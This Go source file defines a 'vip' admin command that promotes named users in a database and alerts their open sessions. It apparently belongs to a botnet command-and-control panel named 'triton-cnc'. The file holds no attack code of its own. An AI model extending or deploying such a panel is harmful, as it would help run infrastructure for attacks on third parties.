package users_edit

import (
	"triton-cnc/core/mysql"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/json/build"
)


func Makevip(sessionss *sessions.Session_Store, cmd []string) {

	if len(cmd) <= 2 {
		sessionss.Channel.Write([]byte("\x1b[0m"+build.Config.AppConfig.AppName+" -> invaild length > users vip=true [users array, eg \"root kanker\"]\r\n"))
		return
	}

	for LenCon := 2; LenCon < len(cmd); LenCon++ {
		User, boolen := database.GetUser(cmd[LenCon])
		if boolen != nil || User == nil {
			sessionss.Channel.Write([]byte("\x1b[0m"+build.Config.AppConfig.AppName+" -> Can't find user you entered at len of \""+cmd[LenCon]+"\"\r\n"))
			continue
		}

		if User.Vip {
			sessionss.Channel.Write([]byte("\x1b[0m"+build.Config.AppConfig.AppName+" -> \""+cmd[LenCon]+"\" is already registered as vip\r\n"))
			continue
		}

		error := database.EditFeild(cmd[LenCon], "Vip", "1")
		if !error {
			sessionss.Channel.Write([]byte("\x1b[0m"+build.Config.AppConfig.AppName+" -> failed to update \""+cmd[LenCon]+"\" to vip\r\n"))
			continue
		} else {
			sessionss.Channel.Write([]byte("\x1b[0m\"\x1b[38;5;2m"+cmd[LenCon]+"\x1b[0m\" is now vip\r\n"))
		}

		for _, session := range sessions.SessionMap {
			if session.User.Username == cmd[LenCon] {
				session.Channel.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K \x1b[38;5;2mYou have been promoted to vip by "+sessionss.User.Username+"\x1b[0m\x1b[38;5;15m\x1b8"))
				session.User.Vip = true
			}
		}

		continue
	}
}